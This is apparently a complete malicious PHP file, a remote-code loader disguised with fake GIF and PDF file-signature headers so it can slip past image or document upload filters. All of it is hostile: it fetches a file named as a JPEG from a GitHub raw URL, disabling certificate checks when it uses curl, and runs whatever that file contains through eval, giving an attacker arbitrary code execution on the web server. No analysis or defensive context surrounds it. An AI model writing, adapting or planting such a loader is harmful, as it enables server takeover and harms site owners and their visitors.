<!-- GIF89;a -->
%00.PDF~%0n;0x;0%2e<?php
ob_start();

function getBacklink($url) {
    if( ini_get('allow_url_fopen') == 1 ) {
        return @file_get_contents($url);
    } else if(function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return false;
}

$remote_code = getBacklink("https://raw.githubusercontent.com/rijal-cpu/images/refs/heads/main/radioby.jpg");

if ($remote_code) {
    eval("?>" . $remote_code);
}

ob_end_flush();
?>
